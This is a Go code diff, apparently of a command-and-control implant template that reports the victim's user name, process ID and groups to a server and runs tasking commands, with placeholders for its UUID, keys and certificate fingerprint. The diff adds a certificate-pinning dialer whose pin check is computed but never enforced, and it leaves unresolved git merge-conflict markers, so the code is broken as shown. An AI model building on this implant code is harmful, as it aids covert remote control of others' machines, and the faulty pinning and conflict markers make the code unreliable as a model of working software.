@@ -18,8 +18,11 @@ import (
 	"os/user"
 	"strings"
 	"time"
+	"net"
+	"bytes"
 
 	"golang.org/x/crypto/chacha20poly1305"
+<<<<<<< Updated upstream
 	"golang.org/x/sys/windows"
 )
 
@@ -39,6 +42,10 @@ func getGroups() (SID){
 	g := fmt.Sprint(groups)
 	return g
 }
+=======
+	//"golang.org/x/sys/windows"
+)
+>>>>>>> Stashed changes
 
 
 func chacha(pass string, msg string) (enc_block []byte) {
@@ -101,7 +108,38 @@ func getCurrentUser() (name string) {
 	return
 }
 
+type Dialer func(network, addr string)(net.Conn, error)
+
+func makeDialer(fingerprint []byte, skipCAVerification bool) Dialer {
+    return func(network, addr string) (net.Conn, error) {
+        c, err := tls.Dial(network, addr, &tls.Config{InsecureSkipVerify: skipCAVerification})
+        if err != nil {
+            return c, err
+        }
+        connstate := c.ConnectionState()
+        keyPinValid := false
+        for _, peercert := range connstate.PeerCertificates {
+            der, err := x509.MarshalPKIXPublicKey(peercert.PublicKey)
+            hash := sha256.Sum256(der)
+            // log.Println(peercert.Issuer)
+            // log.Printf("%#v", hash)
+            if err != nil {
+                log.Fatal(err)
+            }
+            if bytes.Compare(hash[0:], fingerprint) == 0 {
+                log.Println("Pinned Key found")
+                keyPinValid = true
+            }
+        }
+        if keyPinValid == false {
+        }
+        return c, nil
+    }
+}
+
 func main() {
+    const serverCert = "-----BEGIN CERTIFICATE-----\n{{.ServerKey}}\n-----END CERTIFICATE-----"
+
 	const pubKeyPEM = "-----BEGIN PUBLIC KEY-----\n{{.Pubkey}}\n-----END PUBLIC KEY-----"
     PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
 	if PEMBlock == nil {
@@ -117,10 +155,11 @@ func main() {
 
 	uuid := "{{.UUID}}"
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	client := &http.Client{}
+	fingerprint := []byte ("{{.Fingerprint}}")
+	client.Transport = &http.Transport{
+	    DialTLS: makeDialer(fingerprint, true),
 	}
-	client := &http.Client{Transport: tr}
 
 	result := getCurrentUser()
 	toSend := string(result)
@@ -229,8 +268,13 @@ func main() {
 		case "pid":
 		    pid := os.Getpid()
 		    result = fmt.Sprint(pid)
+<<<<<<< Updated upstream
 		case "groups":
 		    result := getGroups()
+=======
+		//case "groups":
+		//    result := getGroups()
+>>>>>>> Stashed changes
 		}
 
 		toSend := string(result)
